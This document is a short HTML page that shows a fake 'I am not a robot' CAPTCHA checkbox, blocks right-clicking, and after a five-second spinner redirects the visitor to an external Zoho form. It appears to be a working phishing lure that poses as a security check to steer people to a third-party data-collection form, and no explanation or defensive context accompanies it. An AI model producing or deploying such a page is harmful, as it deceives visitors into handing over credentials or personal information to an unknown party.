<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>secure</title>
<style>
  body {
    margin: 0;
    padding: 0;
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background-image: url('https://pbs.twimg.com/media/GJAw76RWkAAeKn9?format=jpg&amp;name=large');
    background-size: cover;
    background-repeat: no-repeat;
    background-attachment: fixed;
  }
  .captcha-box {
    background-color: rgba(255, 255, 255, 0.8);
    padding: 20px;
    border-radius: 10px;
    text-align: center;
  }
  .spinner {
    display: none;
    border: 4px solid rgba(0, 0, 255, 0.1);
    border-left-color: #66ccff;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    margin-top: 20px;
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
  .logo {
    position: fixed;
    bottom: 20px;
    width: 200px;
    z-index: 999;
  }
</style>
<script>
  document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
  });
</script>
</head>
<body>

<div class="captcha-box">
  <input type="checkbox" id="robotCheckbox">
  <label for="robotCheckbox">I am not a robot</label>
</div>

<div class="spinner" id="spinner"></div>

<img class="logo" src="https://pbs.twimg.com/media/GJA07lzXIAAETqD?format=png&amp;name=small" alt="Logo">

<script>
  document.getElementById('robotCheckbox').addEventListener('change', function() {
    if (this.checked) {
      document.getElementById('spinner').style.display = 'block';
      setTimeout(function() {
        window.location.href = 'https://forms.zohopublic.com/volt2g1/form/adam1/formperma/4OQqquuEVRnBVenPKSq540Gg5yXNfhiFzBa_eq6L_C8';
      }, 5000);
    }
  });
</script>

</body>
</html>
